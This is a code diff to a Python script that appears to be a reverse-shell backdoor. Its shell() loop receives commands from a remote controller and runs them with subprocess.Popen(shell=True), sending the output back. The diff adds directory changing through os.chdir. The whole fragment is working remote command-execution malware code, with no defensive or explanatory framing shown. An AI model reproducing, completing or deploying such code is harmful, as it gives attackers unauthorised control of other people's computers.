@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import json
+import os
 
 def send(data):
     json_data = json.dumps(data)
@@ -20,6 +21,12 @@ def shell():
         command = receive()
         if command == 'q':
             break
+        elif command[:2] == 'cd' and len(command) > 1:
+            try:
+                os.chdir(command[3:])
+            except:
+                continue
+
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             results = proc.stdout.read() + proc.stderr.read()
